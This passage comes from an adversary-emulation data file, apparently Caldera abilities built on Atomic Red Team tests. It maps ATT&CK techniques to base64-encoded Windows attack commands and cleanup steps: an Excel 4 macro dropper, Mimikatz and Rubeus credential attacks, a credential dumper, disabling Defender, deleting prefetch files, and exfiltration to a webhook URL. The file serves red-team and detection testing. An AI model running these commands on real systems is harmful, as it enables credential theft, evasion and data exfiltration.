kc2hlZXQuQ2VsbHMuSXRlbSgxNiwxKSA9ICI9RldSSVRFTE4oQTUsIGAib1N0cmVhbS5TYXZlVG9GaWxlIGAiYCJDOlxVc2Vyc1xgIiZBMSZgIlxBcHBEYXRhXExvY2FsXFRlbXBcYCImQTImYCJgImAiLCAyYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMTcsMSkgPSAiPUZXUklURUxOKEE1LCBgIm9TdHJlYW0uQ2xvc2VgIikiOyAkc2hlZXQuQ2VsbHMuSXRlbSgxOCwxKSA9ICI9RldSSVRFTE4oQTUsIGAiRW5kIElmYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMTksMSkgPSAiPUZDTE9TRShBNSkiOyAkc2hlZXQuQ2VsbHMuSXRlbSgyMCwxKSA9ICI9RVhFQyhgImV4cGxvcmVyLmV4ZSBDOlxVc2Vyc1xgIiZBMSZgIlxBcHBEYXRhXExvY2FsXFRlbXBcYCImQTMmYCJgIikiOyAkc2hlZXQuQ2VsbHMuSXRlbSgyMSwxKSA9ICI9V0FJVChOT1coKStgIjAwOjAwOjA1YCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMjIsMSkgPSAiPUVYRUMoYCJleHBsb3Jlci5leGUgQzpcVXNlcnNcYCImQTEmYCJcQXBwRGF0YVxMb2NhbFxUZW1wXGAiJkEyJmAiYCIpIjsgJHNoZWV0LkNlbGxzLkl0ZW0oMjMsMSkgPSAiPUhBTFQoKSI7ICRzaGVldC5DZWxscy5JdGVtKDEsMSkuTmFtZSA9ICJydW5tZSI7ICR4bEFwcC5SdW4oInJ1bm1lIik7ICR4bEFwcC5RdWl0KCk7IDsgW1N5c3RlbS5SdW50aW1lLkludGVyb3BzZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkeGxCb29rKSB8IE91dC1OdWxsOyBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcHNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCR4bEFwcCkgfCBPdXQtTnVsbDsgW1N5c3RlbS5HQ106OkNvbGxlY3QoKTsgW1N5c3RlbS5HQ106OldhaXRGb3JQZW5kaW5nRmluYWxpemVycygpOyA7IFJlbW92ZS1WYXJpYWJsZSB4bEJvb2s7IFJlbW92ZS1WYXJpYWJsZSB4bEFwcA==", "ability_id": "f1cce45585d407e267443dc271d89931", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "Excel 4 Macro", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U3RvcC1Qcm9jZXNzIC1OYW1lICJwcm9jZXhwKiIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxhdG9taWNfcmVkdGVhbV94NG1fZXhlYy52YnMiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICIkZW52OlRFTVBccHJvY2V4cC5leGUiIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n", "variations": []}, {"test": "TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOiJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ3VzdG9tIiAtTmFtZSAiQXRvbWljUmVkVGVhbVQxNTQ2LjAxMSIgLVZhbHVlICJBdG9taWNSZWRUZWFtVDE1NDYuMDExIjsgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOiJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcSW5zdGFsbGVkU0RCIiAtTmFtZSAiQXRvbWljUmVkVGVhbVQxNTQ2LjAxMSIgLVZhbHVlICJBdG9taWNSZWRUZWFtVDE1NDYuMDExIg==", "ability_id": "ed65658e4431bc3b636dd0de29bf8e35", "technique_name": "Event Triggered Execution: Application Shimming", "additional_info": {}, "privilege": "", "technique_id": "T1546.011", "platform": "windows", "name": "Registry key creation and/or modification events for SDB", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOiJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ3VzdG9tIiAtTmFtZSAiQXRvbWljUmVkVGVhbVQxNTQ2LjAxMSIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOiJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcSW5zdGFsbGVkU0RCIiAtTmFtZSAiQXRvbWljUmVkVGVhbVQxNTQ2LjAxMSIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing\nthe registry keys that were created. These keys can also be viewed using the Registry Editor.\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gLVBhdGggKEpvaW4tUGF0aCAiJEVudjpTeXN0ZW1Sb290XHByZWZldGNoXCIgKEdldC1DaGlsZEl0ZW0gLVBhdGggIiRFbnY6U3lzdGVtUm9vdFxwcmVmZXRjaFwqLnBmIiAtTmFtZSlbMF0p", "ability_id": "2413b013bc82d152765e2ac34601a327", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete Prefetch File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n", "variations": []}, {"test": "ZHNxdWVyeSAqIC1maWx0ZXIgIihvYmplY3RDbGFzcz10cnVzdGVkRG9tYWluKSIgLWF0dHIgKg==", "ability_id": "f25fb8543b8e49af2aba023985234d1e", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Windows - Discover domain trusts with dsquery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTU1MC4wMDNcYmluXG1pbWlrYXR6LmV4ZSAia2VyYmVyb3M6OnB0dCBOb25lIg==", "ability_id": "d14ff07865705c9d9f5874d346520a03", "technique_name": "Use Alternate Authentication Material: Pass the Ticket", "additional_info": {}, "privilege": "", "technique_id": "T1550.003", "platform": "windows", "name": "Mimikatz Kerberos Ticket Attack", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Similar to PTH, but attacking Kerberos\n", "variations": []}, {"test": "JHBhdGggPSByZXNvbHZlLXBhdGggImM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFBsYXRmb3JtXCpcQ29uZmlnU2VjdXJpdHlQb2xpY3kuZXhlIjsgJiAkcGF0aFswXSBjOlx0ZW1wXGNvbmZpZy54bWwgImh0dHBzOi8vd2ViaG9vay5zaXRlP2Q9c2Vuc2l0aXZlLWRhdGEtaGVyZSI=", "ability_id": "c8299b8b680b37c88bdc284773675a48", "technique_name": "Exfiltration Over Web Service", "additional_info": {}, "privilege": "", "technique_id": "T1567", "platform": "windows", "name": "Data Exfiltration with ConfigSecurityPolicy", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfiltration of data using ConfigSecurityPolicy.exe\nhttps://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf\n", "variations": []}, {"test": "Y3NjcmlwdCBhNzcxZTZfc3lzX2luZm8udmJzID4gJGVudjpURU1QXFQxMDU5LjAwNS5vdXQudHh0", "ability_id": "bab5b923c6f235908dbee26637e8397d", "technique_name": "Command and Scripting Interpreter: Visual Basic", "additional_info": {}, "privilege": "", "technique_id": "T1059.005", "platform": "windows", "name": "Visual Basic script execution to gather local computer information", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["a771e6_sys_info.vbs"], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMDU5LjAwNS5vdXQudHh0IC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJhNzcxZTZfc3lzX2luZm8udmJzIg=="], "executor": "psh", "access": {}, "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.", "variations": []}, {"test": "JGVudjpDT1JfRU5BQkxFX1BST0ZJTElORyA9IDE7ICRlbnY6Q09SX1BST0ZJTEVSID0gJ3swOTEwOGU3MS05NzRjLTQwMTAtODljYi1hY2Y0NzFhZTllMmN9JzsgJGVudjpDT1JfUFJPRklMRVJfUEFUSCA9ICc4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCc7IFBPV0VSU0hFTEwgLWMgJ1N0YXJ0LVNsZWVwIDEn", "ability_id": "1f15da077e50b6a18c8ad3305f8e4b6e", "technique_name": "Hijack Execution Flow: COR_PROFILER", "additional_info": {}, "privilege": "", "technique_id": "T1574.012", "platform": "windows", "name": "Registry-free process scope COR_PROFILER", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["83f016_T1574.012x64.dll"], "cleanup": ["JGVudjpDT1JfRU5BQkxFX1BST0ZJTElORyA9IDA7ICRlbnY6Q09SX1BST0ZJTEVSID0gJyc7ICRlbnY6Q09SX1BST0ZJTEVSX1BBVEggPSAnJw==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4M2YwMTZfVDE1NzQuMDEyeDY0LmRsbCI="], "executor": "psh", "access": {}, "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "variations": []}, {"test": "Y21kLmV4ZSAvYyAiJEVudjp0ZW1wXHJ1YmV1cy5leGUiIGFzcmVwcm9hc3QgL291dGZpbGU6IiRFbnY6dGVtcFxydWJldXNfb3V0cHV0LnR4dCI=", "ability_id": "71c51b6be245af61582d1eb0f3e839b0", "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.004", "platform": "windows", "name": "Rubeus asreproast", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJEVudjp0ZW1wXHJ1YmV1c19vdXRwdXQudHh0IC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "variations": []}, {"test": "bWtkaXIgJFBhdGhUb0F0b21pY3NGb2xkZXJcVDE1NjAuMDAxXHZpY3RpbS1maWxlcyAmJiBjZCAkUGF0aFRvQXRvbWljc0ZvbGRlclxUMTU2MC4wMDFcdmljdGltLWZpbGVzICYmIGVjaG8gIlRoaXMgZmlsZSB3aWxsIGJlIGVuY3J5cHRlZCIgPiAuXGVuY3J5cHRlZF9maWxlLnR4dCAmJiAiJVByb2dyYW1GaWxlcyVcNy16aXBcN3ouZXhlIiB1IGFyY2hpdmUuN3ogKnR4dCAtcGJsdWUgJiYgZGly", "ability_id": "ef8a0b5dca7bf27eac2fc957810b3970", "technique_name": "Archive Collected Data: Archive via Utility", "additional_info": {}, "privilege": "", "technique_id": "T1560.001", "platform": "windows", "name": "Compress Data and lock with password for Exfiltration with 7zip", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Note: Requires 7zip installation\n", "variations": []}, {"test": "Llx0b3RhbGx5bGVnaXQuZXhlICN7aG9zdC5wcm9jZXNzLmlkfSBDOlxVc2Vyc1xQdWJsaWNcY3JlZHMuZG1w", "ability_id": "3c647015-ab0a-496a-8847-6ab173cd2b22", "technique_name": "OS Credential Dumping", "additional_info": {}, "privilege": "", "technique_id": "T1003", "platform": "windows", "name": "MiniDumpWriteDump (Spooky)", "requirements": [{"relationship_match": [{"source": "host.process.id"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["totallylegit.exe"], "cleanup": ["aWYgKFRlc3QtUGF0aCAiQzpcVXNlcnNcUHVibGljXGNyZWRzLmRtcCIpIHsKICBybSAiQzpcVXNlcnNcUHVibGljXGNyZWRzLmRtcCIgLUZvcmNlOwp9Ow==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJ0b3RhbGx5bGVnaXQuZXhlIg=="], "executor": "psh", "access": {}, "description": "Custom GO credential dumper using minidumpwritedump", "variations": []}, {"test": "bmV0IHVzZXIgYWRtaW5pc3RyYXRvciAvZG9tYWlu", "ability_id": "a2946687ae1138d23b0dc040e43d0eb5", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Enumerate Default Domain Admin Details (Domain)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test will enumerate the details of the built-in domain admin account\n", "variations": []}, {"test": "Y21kIC9jICRlbnY6dGVtcFxEZWZlbmRlckNvbnRyb2xcRGVmZW5kZXJDb250cm9sXERlZmVuZGVyQ29udHJvbC5leGUgL0QgRkZGRiB8IE91dC1OdWxs", "ability_id": "0e7be7c522eccd16149f6ad4d45568fc", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Disable Defender with Defender Control", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["Y21kIC9jICRlbnY6dGVtcFxEZWZlbmRlckNvbnRyb2xcRGVmZW5kZXJDb250cm9sXERlZmVuZGVyQ29udHJvbC5leGUgL0UgfCBPdXQtTnVsbA=="], "executor": "psh", "access": {}, "description": "Attempting to use Defender Control software to disable Windows Defender. Upon successful execution, Windows Defender will be turned off. \n", "variations": []}, {"test": "MGNiNzEwX1QxMDU1LmV4ZQ==", "ability_id": "cea3d9d440f5f24e458717e3281423e7", "technique_name": "Process Injection: Asynchronous Procedure Call", "additional_info": {}, "privilege": "", "technique_id": "T1055.004", "platform": "windows", "name": "Process Injection via C#", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["0cb710_T1055.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n", "variations": []}, {"test": "bHMgLXJlY3Vyc2U7IGdldC1jaGlsZGl0ZW0gLXJlY3Vyc2U7IGdjaSAtcmVjdXJzZQ==", "ability_id": "d7967a23c8c030c698893f242e622be1", "technique_name": "File and Directory Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1083", "platform": "windows", "name": "File and Directory Discovery (PowerShell)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n", "variations": []}, {"test": "Y2QgJXRlbXAlXGhhc2hjYXQ2XGhhc2hjYXQtNi4xLjFcaGFzaGNhdC5leGVcLi4gJiYgJXRlbXAlXGhhc2hjYXQ2XGhhc2hjYXQtNi4xLjFcaGFzaGNhdC5leGUgLWEgMCAtbSAxMDAwIC1yIC5ccnVsZXNcSW5jaXNpdmUtbGVldHNwZWFrLnJ1bGUgYzUwNjhiX3NhbS50eHQgY2FiNTlmX3Bhc3N3b3JkLmxzdA==", "ability_id": "70850854e26426b18a74438dc5d7fbfc", "technique_name": "Brute Force: Password Cracking", "additional_info": {}, "privilege": "", "technique_id": "T1110.002", "platform": "windows", "name": "Password Cracking with Hashcat", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["c5068b_sam.txt", "cab59f_password.lst"], "cleanup": ["ZGVsICV0ZW1wJVxoYXNoY2F0Ni43eiA+bnVsIDI+JjEgJiYgZGVsICV0ZW1wJVw3ejE5MDAuZXhlID5udWwgMj4mMSAmJiBkZWwgJXRlbXAlXDd6IC9RIC9TID5udWwgMj4mMSAmJiBkZWwgJXRlbXAlXGhhc2hjYXQtdW56aXAgL1EgL1MgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against", "variations": []}, {"test": "U2V0LUNvbnRlbnQgLVBhdGggJ21lc3NhZ2UudHh0JyAtVmFsdWUgJ3Byb29mIHRoYXQgdGhpcyBtYWNoaW5lIHdhcyBoYWNrZWQuJw==", "ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9", "technique_name": "Defacement", "additional_info": {}, "privilege": "", "technique_id": "T1491", "platform": "windows", "name": "Leave note", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Create a text file for the user to find", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSAtUGF0aCBDOlxVc2Vyc1wgLUZpbHRlciBCb29rbWFya3MgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUZvcmNl", "ability_id": "abc25aecd2ed0524af31e79add29cc43", "technique_name": "Browser Bookmark Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1217", "platform": "windows", "name": "List Google Chrome / Opera Bookmarks on Windows with powershell", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "variations": []}, {"test": "dGFza2xpc3QuZXhlICYmIHNjIHF1ZXJ5ICYmIHNjIHF1ZXJ5IHN0YXRlPSBhbGw=", "ability_id": "d6bb2a19da7246731ed9c44831b135f8", "technique_name": "System Service Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1007", "platform": "windows", "name": "System Service Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n", "variations": []}, {"test": "JFNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0ICgiV1NjcmlwdC5TaGVsbCIpOyAkU2hvcnRDdXQgPSAkU2hlbGwuQ3JlYXRlU2hvcnRjdXQoIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcVDE1NDcuMDA5LmxuayIpOyAkU2hvcnRDdXQuVGFyZ2V0UGF0aD0iY21kLmV4ZSI7ICRTaG9ydEN1dC5Xb3JraW5nRGlyZWN0b3J5ID0gIkM6XFdpbmRvd3NcU3lzdGVtMzIiOzsgJFNob3J0Q3V0LldpbmRvd1N0eWxlID0gMTs7ICRTaG9ydEN1dC5EZXNjcmlwdGlvbiA9ICJUMTU0Ny4wMDkuIjs7ICRTaG9ydEN1dC5TYXZlKCk7IDsgJFNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0ICgiV1NjcmlwdC5TaGVsbCIpOyAkU2hvcnRDdXQgPSAkU2hlbGwuQ3JlYXRlU2hvcnRjdXQoIiRlbnY6UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXFQxNTQ3LjAwOS5sbmsiKTsgJFNob3J0Q3V0LlRhcmdldFBhdGg9ImNtZC5leGUiOyAkU2hvcnRDdXQuV29ya2luZ0RpcmVjdG9yeSA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyIjs7ICRTaG9ydEN1dC5XaW5kb3dTdHlsZSA9IDE7OyAkU2hvcnRDdXQuRGVzY3JpcHRpb24gPSAiVDE1NDcuMDA5LiI7OyAkU2hvcnRDdXQuU2F2ZSgp", "ability_id": "501af516bd8b24fee0c7c650ae5cc861", "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification", "additional_info": {}, "privilege": "", "technique_id": "T1547.009", "platform": "windows", "name": "Create shortcut to cmd in startup folders", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcVDE1NDcuMDA5LmxuayIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gIiRlbnY6UHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXFQxNTQ3LjAwOS5sbmsiIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n", "variations": []}, {"test": "I3tyZW5hbWVkX2JpbmFyeX0gI3t4bWxfcGF5bG9hZH0gb3V0cHV0LnR4dA==", "ability_id": "7a7de73b905f3dc86dd7272cfcd0bf99", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6d2luZGlyXFN5c3RlbTMyXFRhc2tzIjsgJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWUgPSAncmVhZG1lLnR4dCc7ICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseURpciAtQ2hpbGRQYXRoICRJbnN0YWxsZXJBc3NlbWJseUZpbGVOYW1lOyA7ICRDb21tYW5kTGluZSA9ICJyZWFkbWUudHh0IjsgJEV4cGVjdGVkT3V0cHV0ID0gJ0NvbnN0cnVjdG9yXyc7IDsgIyBFeHBsaWNpdGx5IHNldCB0aGUgZGlyZWN0b3J5IHNvIHRoYXQgYSByZWxhdGl2ZSBwYXRoIHRvIHJlYWRtZS50eHQgY2FuIGJlIHN1cHBsaWVkLjsgU2V0LUxvY2F0aW9uICIkRW52OndpbmRpclxTeXN0ZW0zMlxUYXNrcyI7IDsgQ29weS1JdGVtIC1QYXRoICIkKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuUnVudGltZUVudmlyb25tZW50XTo6R2V0UnVudGltZURpcmVjdG9yeSgpKUluc3RhbGxVdGlsLmV4ZSIgLURlc3RpbmF0aW9uICIkRW52OndpbmRpclxTeXN0ZW0zMlxUYXNrc1xub3RlcGFkLmV4ZSI7IDsgJFRlc3RBcmdzID0gQHs7ICAgICBPdXRwdXRBc3NlbWJseURpcmVjdG9yeSA9ICRJbnN0YWxsZXJBc3NlbWJseURpcjsgICAgIE91dHB1dEFzc2VtYmx5RmlsZU5hbWUgPSAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZTsgICAgIEludm9jYXRpb25NZXRob2QgPSAnRXhlY3V0YWJsZSc7ICAgICBDb21tYW5kTGluZSA9ICRDb21tYW5kTGluZTsgICAgIEluc3RhbGxVdGlsUGF0aCA9ICIkRW52OndpbmRpclxTeXN0ZW0zMlxUYXNrc1xub3RlcGFkLmV4ZSI7IH07IDsgJEFjdHVhbE91dHB1dCA9IEludm9rZS1CdWlsZEFuZEludm9rZUluc3RhbGxVdGlsQXNzZW1ibHkgQFRlc3RBcmdzIC1NaW5pbXVtVmlhYmxlQXNzZW1ibHk7IDsgaWYgKCRBY3R1YWxPdXRwdXQgLW5lICRFeHBlY3RlZE91dHB1dCkgezsgICAgIHRocm93IEAiOyBFdmFzaXZlIEluc3RhbGx1dGlsIGludm9jYXRpb24gdGVzdCBmYWlsdXJlLiBJbnN0YWxsZXIgYXNzZW1ibHkgZXhlY3V0aW9uIG91dHB1dCBkaWQgbm90IG1hdGNoIHRoZSBleHBlY3RlZCBvdXRwdXQuOyBFeHBlY3RlZDogJEV4cGVjdGVkT3V0cHV0OyBBY3R1YWw6ICRBY3R1YWxPdXRwdXQ7ICJAOyB9", "ability_id": "c90a6b345875fbb3df965075433b0f29", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil evasive invocation", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRFbnY6d2luZGlyXFN5c3RlbTMyXFRhc2tzXHJlYWRtZS50eHQiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtIC1QYXRoICIkRW52OndpbmRpclxTeXN0ZW0zMlxUYXNrc1xyZWFkbWUuSW5zdGFsbExvZyIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gLVBhdGggIiRFbnY6d2luZGlyXFN5c3RlbTMyXFRhc2tzXHJlYWRtZS5JbnN0YWxsU3RhdGUiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtIC1QYXRoICIkRW52OndpbmRpclxTeXN0ZW0zMlxUYXNrc1xub3RlcGFkLmV4ZSIgLUVycm9yQWN0aW9uIElnbm9yZQ==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n", "variations": []}, {"test": "cm1kaXIgL3MgL3EgJXRlbXAlXGRlbGV0ZW1lX1QxNTUxLjAwNA==", "ability_id": "36d16de59dd70ebe5b729dc10f970865", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": 